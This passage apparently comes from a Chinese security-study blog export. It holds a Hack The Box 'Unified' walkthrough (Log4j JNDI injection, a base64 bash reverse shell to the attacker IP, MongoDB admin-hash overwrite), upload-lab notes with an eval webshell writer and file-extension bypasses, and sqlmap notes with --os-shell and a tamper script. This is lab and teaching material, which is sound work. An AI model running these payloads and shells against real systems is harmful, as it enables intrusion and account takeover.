ite;backgroun\nSF:d-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\nSF:\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:bl\nSF:ack;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border:none;}</\nSF:style></head><body><h1>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20\nSF:Request</h1></body></html>\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 411.50 seconds\n```\n\n开放端口有：22、6789、8080、8443\n\n> 扫描显示端口8080打开，正在运行HTTP代理。代理似乎将请求重定向到端口8443，该端口似乎正在运行SSL web服务器。我们注意到端口8443上页面的HTTP标题是“UniFi网络”。\n\n访问8080端口，重定向到这里：[https://10.129.181.184:8443/manage/account/login?redirect=%2Fmanage](https://10.129.181.184:8443/manage/account/login?redirect=%2Fmanage)\n\n不贴图了，上传太麻烦了，大概就是一个登录界面，显示`UniFi 6.4.54` 的CMS（内容管理系统）\n\n网上查找版本漏洞：CVE-2021-44228（Apache Log4j远程代码执行漏洞）[NVD - CVE-2021-44228 (nist.gov)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)\n\n关于log4j的更多资料：[What’s Going on With Log4j? (hackthebox.com)](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation)\n\n先抓个包，接下来就是验证这个网站是否真的存在这个漏洞：\n\n```bash\n#登录验证的原始包\nPOST /api/login HTTP/1.1\nHost: 10.129.183.167:8443\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://10.129.183.167:8443/manage/account/login?redirect=%2Fmanage\nContent-Type: application/json; charset=utf-8\nOrigin: https://10.129.183.167:8443\nContent-Length: 74\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\nConnection: close\n\n{\n\t\"username\":\"admin\",\n\t\"password\":\"admin1234\",\n\t\"remember\":false,\n\t\"strict\":true\n}\n```\n\n![Untitled](../image/Unified0.png)\n\npayload：`${jndi:ldap://{TunX IP Address}/whatever}`\n\n探测注入点是否存在，If the request causes the server to connect back to us, then we have verified that the application is vulnerable.(假如请求引起的服务器回连我们，我们就已经验证了应用程序存在漏洞。)\n\n![Untitled](../image/Unified1.png)\n\n> **JNDI**是Java命名和目录接口API的首字母缩写。通过调用此API，应用程序可以定位资源和其他程序对象。资源是一个程序对象，它提供与系统（如数据库服务器和消息传递系统）的连接。\n\n> **LDAP**是轻量级目录访问协议的缩写，它是一种开放的、与供应商无关的、行业标准的应用程序协议，用于通过Internet或网络访问和维护分布式目录信息服务。LDAP运行的默认端口是端口389。\n\n<aside>\n🔒 tcpdump：是Wireshark的程序或软件，但它是命令行版本。\n\n\n-i： 选择接口。（例如eth0、wlan、tun0）\n\nport 389：选择我们正在侦听的端口。\n\n</aside>\n\nifconfig确认ip后开始监听tun0：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─#  tcpdump -i tun0 port 389\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes\n08:06:56.744094 IP 10.129.202.83.38274 > 10.10.14.84.ldap: Flags [S], seq 4090119358, win 64240, options [mss 1340,sackOK,TS val 4125686722 ecr 0,nop,wscale 7], length 0\n08:06:56.744126 IP 10.10.14.84.ldap > 10.129.202.83.38274: Flags [R.], seq 0, ack 4090119359, win 0, length 0\n```\n\ntcpdump输出显示了我们机器上正在接收的连接。这证明该应用程序确实存在漏洞，因为它正试图在LDAP端口389上连接回我们。\n\n安装Open-JDK and Maven为了构建payload并且发送，以及能在被攻击的系统运行：\n\nOpen JDK是Java开发工具包，用于构建Java应用程序。另一方面，Maven是一个集成开发环境（IDE），可用于创建结构化项目并将我们的项目编译为jar文件。\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# mvn -v\nApache Maven 3.8.7\nMaven home: /usr/share/maven\nJava version: 17.0.6, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64\nDefault locale: en_US, platform encoding: UTF-8\nOS name: \"linux\", version: \"6.1.0-kali9-amd64\", arch: \"amd64\", family: \"unix\"\n```\n\n安装rogue-jndi工具并编译：\n\n```bash\ngit clone https://github.com/veracode-research/rogue-jndi\ncd rogue-jndi\nmvn package\n```\n\n编译成功后显示：\n\n```bash\n[INFO] Replacing /home/kali/Desktop/rogue-jndi/target/RogueJndi-1.1.jar with /home/kali/Desktop/rogue-jndi/target/RogueJndi-1.1-shaded.jar\n[INFO] Dependency-reduced POM written at: /home/kali/Desktop/rogue-jndi/dependency-reduced-pom.xml\n[INFO] ------------------------------------------------------------------------\n[INFO] BUILD SUCCESS\n[INFO] ------------------------------------------------------------------------\n[INFO] Total time:  07:29 min\n[INFO] Finished at: 2023-07-31T07:54:52-04:00\n[INFO] ------------------------------------------------------------------------                                                                                         \n```\n\n查看编译后可运行的程序：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi]\n└─# ls -al target\ntotal 11692\ndrwxr-xr-x 6 root root     4096 Jul 31 07:54 .\ndrwxr-xr-x 5 root root     4096 Jul 31 07:54 ..\ndrwxr-xr-x 4 root root     4096 Jul 31 07:51 classes\ndrwxr-xr-x 3 root root     4096 Jul 31 07:51 generated-sources\ndrwxr-xr-x 2 root root     4096 Jul 31 07:52 maven-archiver\ndrwxr-xr-x 3 root root     4096 Jul 31 07:51 maven-status\n-rw-r--r-- 1 root root    22240 Jul 31 07:52 original-RogueJndi-1.1.jar\n-rw-r--r-- 1 root root 11920109 Jul 31 07:54 RogueJndi-1.1.jar\n```\n\n查看肉鸽帮助命令：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi]\n└─# cd target    \n                                                                                              \n┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi/target]\n└─# java -jar RogueJndi-1.1.jar --help\n+-+-+-+-+-+-+-+-+-+\n|R|o|g|u|e|J|n|d|i|\n+-+-+-+-+-+-+-+-+-+\nUsage: java -jar target/RogueJndi-1.0.jar [options]\n  Options:\n    -c, --command  Command to execute on the target server (default: \n                   /Applications/Calculator.app/Contents/MacOS/Calculator) \n    -n, --hostname Local HTTP server hostname (required for remote \n                   classloading and websphere payloads) (default: 127.0.1.1)\n    -l, --ldapPort Ldap bind port (default: 1389)\n    -p, --httpPort Http bind port (default: 8000)\n    --wsdl         [websphere1 payload option] WSDL file with XXE payload \n                   (default: /list.wsdl)\n    --localjar     [websphere2 payload option] Local jar file to load (this \n                   file should be located on the remote server) (default: \n                   ../../../../../tmp/jar_cache7808167489549525095.tmp) \n    -h, --help     Show this help\n```\n\n> \n>\n>\n> 可以看到它的`--command`后面就跟想要执行的系统命令，我们就可以写一个反弹shell了\n> 同时为了数据再传输过程中不丢失，我们对反弹shell命令进行base64编码\n> `echo \"/bin/bash -c '/bin/bash -i >&/dev/tcp/10.10.14.179/4444 0>&1'\" | base64`\n> 这样就得到了base64加密后的shell\n\n```bash\n┌──(kali㉿kali)-[~/Desktop]\n└─$ echo \"/bin/bash -c '/bin/bash -i >&/dev/tcp/10.10.14.84/4444 0>&1'\" | base64          \n\nL2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+\nJjEnCg==\n```\n\n使用肉鸽监听4444端口：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop/rogue-jndi/target]\n└─# java -jar RogueJndi-1.1.jar --command \"bash -c {echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}\" --hostname \"10.10.14.84\"       \n+-+-+-+-+-+-+-+-+-+\n|R|o|g|u|e|J|n|d|i|\n+-+-+-+-+-+-+-+-+-+\nStarting HTTP server on 0.0.0.0:8000\nStarting LDAP server on 0.0.0.0:1389\nMapping ldap://10.10.14.84:1389/o=websphere1 to artsploit.controllers.WebSphere1\nMapping ldap://10.10.14.84:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1\nMapping ldap://10.10.14.84:1389/ to artsploit.controllers.RemoteReference\nMapping ldap://10.10.14.84:1389/o=reference to artsploit.controllers.RemoteReference\nMapping ldap://10.10.14.84:1389/o=tomcat to artsploit.controllers.Tomcat\nMapping ldap://10.10.14.84:1389/o=websphere2 to artsploit.controllers.WebSphere2\nMapping ldap://10.10.14.84:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2\nMapping ldap://10.10.14.84:1389/o=groovy to artsploit.controllers.Groovy\n```\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# nc -lvp 4444             \nlistening on [any] 4444 ...\n10.129.202.83: inverse host lookup failed: Unknown host\nconnect to [10.10.14.84] from (UNKNOWN) [10.129.202.83] 48416\nbash: cannot set terminal process group (7): Inappropriate ioctl for device\nbash: no job control in this shell\nunifi@unified:/usr/lib/unifi$\n```\n\n```bash\nunifi@unified:/usr/lib/unifi$ ls -al\nls -al\ntotal 40\ndrwxr-xr-x 1 unifi unifi  4096 Jul 31 12:36 .\ndrwxr-xr-x 1 root  root   4096 Jan  2  2022 ..\ndrwxr-xr-x 2 unifi unifi  4096 Jan  2  2022 bin\nlrwxrwxrwx 1 root  root     11 Sep 20  2021 data -> /unifi/data\ndrwxr-xr-x 3 unifi unifi  4096 Jan  2  2022 dl\ndrwxr-xr-x 3 unifi unifi 12288 Jan  2  2022 lib\nlrwxrwxrwx 1 root  root     10 Sep 20  2021 logs -> /unifi/log\nlrwxrwxrwx 1 root  root     14 Sep 20  2021 run -> /var/run/unifi\ndrwxr-xr-x 3 unifi unifi  4096 Jan  2  2022 webapps\ndrwxr-xr-x 3 unifi unifi  4096 Jul 31 12:36 work\nunifi@unified:/usr/lib/unifi$\n```\n\n发现user flag：\n\n```bash\nunifi@unified:/home/michael$ cat user.txt\ncat user.txt\n6ced1a6a89e666c0620cdb10262ba127\n```\n\n## 提权部分：\n\n查看进程，发现`bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1`\n\n> MongoDB是一个源代码可用的跨平台面向文档的数据库程序。\n> MongoDB被归类为NoSQL数据库程序，它使用具有可选模式的类似JSON的文档。\n\n```bash\nunifi@unified:/usr/lib/unifi$ ps aux\nps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nunifi          1  0.0  0.0   1080     4 ?        Ss   12:36   0:00 /sbin/docker-init -- /usr/local/bin/docker-entrypoint.sh unifi\nunifi          7  0.0  0.1  18512  3044 ?        S    12:36   0:00 bash /usr/local/bin/docker-entrypoint.sh unifi\nunifi         17  0.8 27.3 3676460 555952 ?      Sl   12:36   0:53 java -Dunifi.datadir=/unifi/data -Dunifi.logdir=/unifi/log -Dunifi.rundir=/var/run/unifi -Xmx1024M -Djava.awt.headless=true -Dfile.encoding=UTF-8 -jar /usr/lib/unifi/lib/ace.jar start\nunifi         67  0.2  4.1 1101696 85156 ?       Sl   12:36   0:17 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1\nunifi       1969  0.0  0.1  18380  3088 ?        S    13:45   0:00 bash -c {echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}\nunifi       1973  0.0  0.1  18512  3288 ?        S    13:45   0:00 bash -i\nunifi       1976  0.0  0.1  18380  2992 ?        S    13:45   0:00 /bin/bash -c /bin/bash -i >&/dev/tcp/10.10.14.84/4444 0>&1\nunifi       1977  0.0  0.1  18512  3448 ?        S    13:45   0:00 /bin/bash -i\nunifi       2874  0.0  0.1  18380  3104 ?        S    14:18   0:00 bash -c {echo,L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC44NC80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}\nunifi       2878  0.0  0.1  18512  3356 ?        S    14:18   0:00 bash -i\nunifi       2881  0.0  0.1  18380  2984 ?        S    14:18   0:00 /bin/bash -c /bin/bash -i >&/dev/tcp/10.10.14.84/4444 0>&1\nunifi       2882  0.0  0.1  18512  3216 ?        S    14:18   0:00 /bin/bash -i\nunifi       2899  0.0  0.1  34408  2824 ?        R    14:19   0:00 ps aux\n```\n\n让我们通过使用mongo命令行实用程序并尝试提取管理员密码来与MongoDB服务进行交互。使用关键字UniFi Default Database在谷歌上快速搜索显示，UniFi应用程序的默认数据库名称为ace。\n\n```bash\nunifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"\n<17 ace --eval \"db.admin.find().forEach(printjson);\"\nMongoDB shell version v3.6.3\nconnecting to: mongodb://127.0.0.1:27117/ace\nMongoDB server version: 3.6.3\n{\n        \"_id\" : ObjectId(\"61ce278f46e0fb0012d47ee4\"),\n        \"name\" : \"administrator\",\n        \"email\" : \"administrator@unified.htb\",\n        \"x_shadow\" : \"$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.\",\n        \"time_created\" : NumberLong(1640900495),\n        \"last_site_name\" : \"default\",\n```\n\n输出显示一个名为Administrator的用户。他们的密码散列位于x_shadow变量中，但在这种情况下，任何密码破解实用程序都无法破解它。相反，我们可以用自己创建的哈希更改x_shadow密码哈希，以便替换管理员密码并向管理面板进行身份验证。为此，我们可以使用mkpasswd命令行实用程序。\n\n先使用`mkpasswd -m sha-512 password`命令，得到password的sha512加密后的值：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# mkpasswd -m sha-512 password\n$6$eLXCcCov55K4HCAT$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.\n```\n\n将administrator的密码修改为password：\n\n```bash\nunifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval 'db.admin.update({\"_id\":ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set：{\"x_shadow\":\"$6$hwb9W.VC28pwXtPT$N8DRe.81H.wB3NN5Ac/5zhGdQkKAibE/i/7I6kvKaVbWGYApa9EghEhtyqtz39qS6x6oDNRNo5z9Nk9m2VMio0\"}})'\n<aVbWGYApa9EghEhtyqtz39qS6x6oDNRNo5z9Nk9m2VMio0\"}})'\nMongoDB shell version v3.6.3\nconnecting to: mongodb://127.0.0.1:27117/ace\nMongoDB server version: 3.6.3\n2023-07-31T15:15:08.132+0100 E QUERY    [thread1] SyntaxError: illegal character @(shell eval):1:66\n```\n\n> SHA-512或安全哈希算法512是一种哈希算法，用于将任何长度的文本转换为固定大小的字符串。每个输出产生一个长度为512位（64字节）的SHA-512。该算法通常用于电子邮件地址哈希、密码哈希…\n\n在哈希过程中添加salt，以强制其唯一性，在不增加用户需求的情况下增加其复杂性，并减轻哈希表等密码攻击。\n\n```bash\nunifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval 'db.admin.update({\"_id\":ObjectId(\"61ce278f46e0fb0012d47ee4\")},{$set:{\"x_shadow\":\"$6$eLXCcCov55K4HCAT$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.\"}})'                                       \n<q2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.\"}})'                                                                                                                                                                                                                                               \nMongoDB shell version v3.6.3                                                                                                                                                                                                                                                                       \nconnecting to: mongodb://127.0.0.1:27117/ace                                                                                                                                                                                                                                                       \nMongoDB server version: 3.6.3                                                                                                                                                                                                                                                                      \nWriteResult({ \"nMatched\" : 1, \"nUpserted\" : 0, \"nModified\" : 1 })                                                                                                                                                                                                                                  \nunifi@unified:/usr/lib/unifi$\n```\n\n查看结果有没有修改成功：\n\n```bash\nunifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval \"db.admin.find().forEach(printjson);\"                                                                                                                                                                                                  \n<17 ace --eval \"db.admin.find().forEach(printjson);\"                                                                                                                                                                                                                                               \nMongoDB shell version v3.6.3                                                                                                                                                                                                                                                                       \nconnecting to: mongodb://127.0.0.1:27117/ace                                                                                                                                                                                                                                                       \nMongoDB server version: 3.6.3                                                                                                                                                                                                                                                                      \n{                                                                                                                                                                                                                                                                                                  \n        \"_id\" : ObjectId(\"61ce278f46e0fb0012d47ee4\"),                                                                                                                                                                                                                                              \n        \"name\" : \"administrator\",                                                                                                                                                                                                                                                                  \n        \"email\" : \"administrator@unified.htb\",                                                                                                                                                                                                                                                     \n        \"x_shadow\" : \"$6$eLXCcCov55K4HCAT$29tc0YWNS6dOqvVCwzgLqzEjpAgZCGejesNSDxBaq2wYqVKvx1ezCtB9Py49tVIH9jc0Z1F778xCAgCuwAv1V.\",                                                                                                                                                                 \n        \"time_created\" : NumberLong(1640900495),                                                                                                                                                                                                                                                   \n        \"last_site_name\" : \"default\",\n```\n\n使用管理员用户和密码成功登录，在setting里可以发现root的密码：NotACrackablePassword4U2022，使用ssh连接root用户：\n\n```bash\n┌──(root㉿kali)-[/home/kali/Desktop]\n└─# ssh root@10.129.202.83\nroot@10.129.202.83's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n```\n\n最后的root flag在这里：\n\n```bash\nroot@unified:~# ls\nroot.txt\nroot@unified:~# cat root.txt \ne50bc93c75b634e4b272d2f771c33681\n```\n\n![Untitled](../image/Unified2.png)\n\n# Listening\n\n1. You may be wondering what it is, and why people are so concerned about it. Some even call it the worst vulnerability since Wannna Cry.\n2. Log4j is a popular logging library for Java created in 2001. It is part of the Apache Software Foundation, however, this doesn’t mean the maintainers are paid. All of their work is volunteer-based.\n3. The logging library's main purpose is to provide developers with a way to change the format and verbosity of logging through configuration files versus code.\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"web攻防笔记第47天","url":"/2023/07/28/web攻防笔记第47天/","content":"\n# 47\n\n## 学习前必读：\n\n1、课前一定要明白：\n**无文件解析安全问题上，格式解析是一对一的（不能jpg解析php）\n换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析**\n\n2、文件上传安全指的是攻击者通过**利用上传实现后门的写入连接后门进行权限控制**的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战！\n\n## 测试环境安装参考：\n\n[https://github.com/ffffffff0x/f8x](https://github.com/ffffffff0x/f8x)\n\n[https://github.com/fuzzdb-project/fuzzdb](https://github.com/fuzzdb-project/fuzzdb)\n\n[https://github.com/sqlsec/upload-labs-docker](https://github.com/sqlsec/upload-labs-docker)\n\n1. 下载上述资源\n\n2. docker安装\n\n   `f8x -d` 或 `f8x -docker`\n\n3. 进入项目文件夹\n\n   `cd upload-labs-docker`\n\n4. 一键部署运行\n   `docker-compose up -d`\n\n## upload-labs-docker知识点：\n\n1、前端JS\n\n<aside>\n💡 如何判断是否是前端验证呢？\n首先抓包监听，如果上传文件的时候还没有抓取到数据包，但是浏览器就提示文件类型不正确的话，那么这个多半就是前端校验了\n\n\n</aside>\n\n- [x] 第一关：使用哥斯拉生成后门在可上传文件类型（如.jpg）中，上传后，因前端验证，后端不验证，所以抓包修改文件类型，直接发送.php文件，再连接就行。\n\n2、.htaccess（中间件）\n`AddType application/x-httpd-php .png` \n\n借助这个配置让.png的命名文件当做类型`application/x-httpd-php .png`执行（php的类型）\n\n当做php执行\n\n> htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页301重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n>\n> - [x] 第二关：上传2.php，抓包该参数，文件格式改成.htaccess，内容改成`AddType application/x-httpd-php .png` ，接着上传2.png，内容包含php木马后门，直接哥斯拉连接2.png\n\n3、MIME类型\n`Content-Type：image/png` \n\n> **媒体类型**\n>\n>\n> （通常称为**Multipurpose Internet Mail Extensions**或**MIME**类型 ）是一种标准，用来表示文档、文件或字节流的性质和格式。\n>\n> MIME的组成结构非常简单；由类型与子类型两个字符串中间用 '/' 分隔而组成。不允许空格存在。type 表示可以被分多个子类的独立类别。subtype 表示细分后的每个类型。\n>\n> 通用的结构为：\n>\n> ```bash\n> type/subtype\n> ```\n>\n> MIME类型对大小写不敏感，但是传统写法都是小写。\n>\n> - [x] 第三关：修改类型就行了，验证方式不能只通过一种方式，需要多方位去验证\n\n4、文件头判断\n`GIF89a` \n\n> 一个文件里面的内容到底是啥？用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。\n>\n>\n> 常见的文件头标志如下：\n>\n> JPEG (jpg)，文件头：\n>\n> ```\n> FFD8FF\n> ```\n>\n> PNG (png)，文件头：\n>\n> ```\n> 89504E47\n> ```\n>\n> GIF (gif)，文件头：\n>\n> ```\n> 47494638\n> ```\n>\n> HTML (html)，文件头：\n>\n> ```\n> 68746D6C3E\n> ```\n>\n> ZIP Archive (zip)，文件头：\n>\n> ```\n> 504B0304\n> ```\n>\n> RAR Archive (rar)，文件头：\n>\n> ```\n> 52617221\n> ```\n>\n> Adobe Acrobat (pdf)，文件头：\n>\n> ```\n> 255044462D312E\n> ```\n>\n> MS Word/Excel (xls.or.doc)，文件头：\n>\n> ```\n> D0CF11E0\n> ```\n>\n> - [x] 第四关：修改上传文件前缀为GIF，然后抓包把类型也改了，上传\n\n5、黑名单-过滤不严\n`无递归，pphphp`，也没有过滤大小写 \n\n![replace.png](../image/replace.png)\n\n- [x] 第五关：上传一个.pphphp\n\n6、黑名单-过滤不严\n`系统大小写敏感属性` \n\n![head.png](../image/head.png)\n\n因为题目环境是 Docker 容器运行的 Linux 系统，所以本题人工修改成了 Windows 的特性\n\n**Linux区分大小写，Windows不区分**\n\n- [x] 第六关：上传一个.Php\n\n7、低版本GET-%00截断\n`自动解码一次\n/var/www/html/upload/x.php%00` \n\n*url上面 %00 （自动解码一次）*\n\n> PHP 内核是由 C 语言实现的，所以使用了 C 语言中的一些字符串处理函数。比如在连接字符串时候， 0 字节 \n> (\\x00) 将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个 0 字节，就能截断 file 变量之后的字符串\n>\n>\n> 这种方法只适用于\n>\n> - magic_quotes_gpc = Off\n> - PHP 版本小于 5.3.4\n> - [x] 第七关：确认版本无误后，上传正确格式包含木马的图片文件，抓包，修改GET上传路径，使用%00截断后面的内容\n\n8、低版本POST-%00截断（环境要求与第七题同）\n`手工解码一次\n../upload/x.php%00 二次解码` \n\n00截断 是%00解码结果\n\n*post下面 %00 （手工解码一次）*\n\n- [x] 第八关：上传正确格式包含木马的图片文件，抓包，修改POST数据包下面上传路径，使用%00截断后面的内容，接着使用解码解回去发送\n\n9、黑名单-过滤不严\n`php3` \n\nfuzzdbmaster项目中的字典，后缀爆破：attack file-upload altextensions-php.txt\n\n![head.png](../image/head 1.png)\n\n- [x] 第九关：抓包，php字典后缀爆破，看长度和响应路径\n\n10、逻辑不严-条件竞争\n\n逻辑缺陷-先上传后判断 → 访问即创建代码（访问了自动触发代码 新建一个文件写入后门）\n\n正确：先判断，后上传\n`<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>');?>`\n上传不断发包\n请求不断发包\n\n> 条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。\n>\n>\n> 攻击者上传了一个用来生成恶意 shell 的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell 文件，后续的一切就都不是问题了。\n>\n> 不过竞争的马因为生存周期短的原因，所以和普通的 Webshell 不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小 Webshell，落红不是无物，化作春泥更护花（泪目）。\n\n![head.png](../image/head 2.png)\n\n- [x] 第十关：在文件停留过服务器的一秒内快速访问生成后门，使用Null payloads和continue indefinitely持续访问30010以及30010/upload/xiao.php，然后一直刷新\n\n我的电脑好像太慢了，一直刷不出来，绝\n\n11、二次渲染\n`先搞个正常图片，上传导出渲染后的图片`\n`对比保留部分，在保留部分添加后门代码`\n`最后利用提示的文件包含执行图片后门代码` \n\n![head.png](../image/head 3.png)\n\n- [x] 第十一关：使用16进制编辑器把后门插入到两个图片保留的一样部分\n\n12、函数缺陷\n`move_uploaded_file 1.php/.` \n\n![head.png](../image/head 4.png)\n\n如果可以让我们自己发挥重命名，那么`shell.php/.` 可以上传一个php文件\n\n13、代码审计-数组绕过\n-----------------------------174283082921961\nContent-Disposition: form-data; name=\"save_name[0]\"\n\n[http://2.php/](http://2.php/)\n-----------------------------174283082921961\nContent-Disposition: form-data; name=\"save_name[2]\"\n\ngif\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"web攻防笔记第46天","url":"/2023/07/26/web攻防笔记第46天/","content":"\n参考资料：https://www.cnblogs.com/bmjoker/p/9326258.html\n\n最重要的：搞清楚数据库类型\n\n### 数据猜解-库表列数据&字典\n\n测试：http://vulnweb.com/\n\n```bash\n--current-db   #获取当前数据库名\n\n--tables -D \"数据库名\" \t#获取表名\n\n--columns -T \"表名\" -D \"数据库名\"\t#获取列名\n\n--dump -C \"列名\" -T \"表名\" -D \"数据库名\"\t#获取数据\n```\n\n\n\n### 权限操作-文件&命令&交互式\n\n测试：**MYSQL高权限注入**\n\n```bash\n#引出权限：\n--is-dba \t#查看权限\n--privileges\t#是否是数据库管理员\n\n#引出文件：\n--file-read \t#读取指定文件\n--file-write \t #写入本地文件\n--file-dest \n\n#引出命令：\n--os-cmd=ver/calc\n--os-shell \n--sql-shell\n```\n\n\n\n### 提交方法-POST&HEAD&JSON\n\n测试：Post Cookie Json\n\n```bash\n--data \"\"\t#表单里POST请求，抓包找数据请求，不推荐\n\n--cookie \"\"\t#Cookie，不推荐\n\n-r 1.txt\t#推荐，数据完整性。把请求标头放进文件，但其实文件里不知道注入点，可使用星号（*）标明注入点\n```\n\n\n\n### 绕过模块-Tamper脚本-使用&开发\n\n测试：base64注入 有过滤的注入\n\n**tamper模块：里面有很多脚本，可以直接使用，查看说明书就行**\n\n```python\n--tamper=base64encode.py\n--tamper=test.py\n\n#bypass.py\nfrom lib.core.enums import PRIORITY\n__priority__ = PRIORITY.LOW\n\ndef dependencies():\n\tpass\n\n#对于有过滤的语句怎么绕过，大小写替换\ndef tamper(payload, **kwargs):\n\tif payload:      \n\t\tpayload = payload.replace('SELECT','sElEct')\n\t\tpayload = payload.replace('OR','Or')\n\t\tpayload = payload.replace('AND','And')\n\t\tpayload = payload.replace('SLEEP','SleeP')\n\t\tpayload = payload.replace('ELT','Elt')\n\treturn payload\n```\n\n\n\n### 分析拓展-代理&调试&指纹&风险&等级\n\n1、后期分析调试：\n\n```bash\n-v=(0-6)  #详细的等级(0-6)，4HTTP请求用的比较多\n\n--proxy \"http://xx:xx\" #代理注入\n```\n\n2、打乱默认指纹（sqlmap特征-UA打头）：\n\n```bash\n--user-agent \"\"  #自定义user-agent\n\n--random-agent  #随机user-agent\n\n--time-sec=(2,5) #延迟响应，默认为5\n```\n\n3、使用更多的测试：测试Header注入\n\n```bash\n--level=(1-5) #要执行的测试水平等级（深度），默认为1 \n\n--risk=(0-3)  #测试执行的风险等级，默认为1 \n```\n\n代理池：使用快代理隧道代理（价格略高）\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"HTB-Vaccine","url":"/2023/07/24/HTB-Vaccine/","content":"\n开局资料：\n\n[https://blog.csdn.net/qq_40927195/article/details/126604517](https://blog.csdn.net/qq_40927195/article/details/126604517)\n\n[HTB-Vaccine - laolao - 博客园 (cnblogs.com)](https://www.cnblogs.com/chrysanthemum/p/15130130.html)\n\n先扫：\n\n```bash\n┌──(root㉿kali)-[/home/kali]\n└─# nmap -sC -sV 10.129.103.172\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 